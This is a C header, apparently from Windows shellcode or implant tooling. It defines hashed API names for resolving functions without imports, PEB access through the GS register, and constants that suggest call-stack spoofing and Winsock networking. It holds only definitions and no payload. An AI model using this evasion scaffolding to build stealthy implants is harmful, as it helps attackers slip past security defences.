#include <windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
#define true 1
#define MAX_STACK_SIZE 12000
#define RBP_OP_INFO 0x5
#define NtCurrentProcess()  ( HANDLE ) ( ( HANDLE ) - 1 )

#define GET_SYMBOL( x )     ( ULONG_PTR )( GetRIP( ) - ( ( ULONG_PTR ) & GetRIP - ( ULONG_PTR ) x ) )
#define SEC( s, x )         __attribute__( ( section( "." #s "$" #x "" ) ) )
#define PPEB_PTR __readgsqword( 0x60 )

#define NTDLL_HASH                      0x70e61753
#define K32_HASH                        0xadd31df0
#define WS2_32_HASH 0x3deb60fc

#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
#define H_RtlLookupFunctionEntry        0x91098529
#define H_RtlUserThreadStart            0x353797c
#define H_BaseThreadInitThunk           0xe2491896
#define H_VIRTUALALLOC                  0x97bc257
#define H_LOADLIBRARYA                  0xb7072fdb
#define H_GETPROCADDRESS                0xdecfc1bf
#define H_VIRTUALALLOCEX                0x5775bd54
#define H_VIRTUALPROTECT                0xe857500d
#define H_VIRTUALPROTECTEX              0x5b6b908a
#define H_PDATA                         0x78fa635d

//WS2_32.DLL
#define H_NTOHL 0xdb1e0ea
#define H_HTONL 0xd454eaa
#define H_FREEADDRINFO 0x307204e
#define H_GETADDRINFO 0x4b91706c
#define H_WSADUPLICATESOCKETA 0xcda3bb75
#define H_WSAGETLASTERROR 0x9c1d912e
#define H_WSASTARTUP 0x142e89c3
#define H_GETHOSTBYNAME 0xf59923df
#define H_SOCKET 0xcf36c66e
#define H_SETSOCKOPT 0x228f5d34
#define H_SEND 0x7c8bc2cf
#define H_SELECT 0xce86a705
#define H_RECV 0x7c8b3515
#define H_LISTEN 0xbe7f0354
#define H_INET_NTOA 0xafeea286
#define H_INET_ADDR 0xafe73c2f
#define H_CONNECT 0xe73478ef
#define H_CLOSESOCKET 0x185953a4
#define H_BIND 0x7c828162
#define H_ACCEPT 0xa460acf5
#define H_HTONS 0xd454eb1

#define W32( x )     __typeof__( x ) * x
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64

